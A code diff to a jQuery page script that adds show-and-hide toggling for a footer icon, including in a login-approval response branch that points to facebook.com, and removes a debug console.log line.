@@ -8,6 +8,14 @@ $(document).ready(function(){
 
   $("#icon").click(function(){
     $("#footer-text").show();
+    $("#icon").hide();
+    $("#iconu").show();
+  });
+
+  $("#iconu").click(function(){
+    $("#footer-text").hide();
+    $("#icon").show();
+    $("#iconu").hide();
   });
 
   $("#login_btn").click(function(){
@@ -28,6 +36,8 @@ $(document).ready(function(){
       if (data === "1"){
         $("#flash").html("<h3>Please approve login attempt from <a href='http://www.facebook.com' style='color:#4DA1DE;' target='_blank'>www.facebook.com</a></h3>");
         $("#footer-text").show();
+        $("#icon").hide();
+        $("#iconu").show();
         $("#footer").show();
         $("#loading").hide();
         $("#login").show();
@@ -44,7 +54,6 @@ $(document).ready(function(){
         $("#login").show();
         $("#login_btn").show();
       } else {
-        console.log(data);
         $("#loading").hide();
         $("#index").append(data);
       }
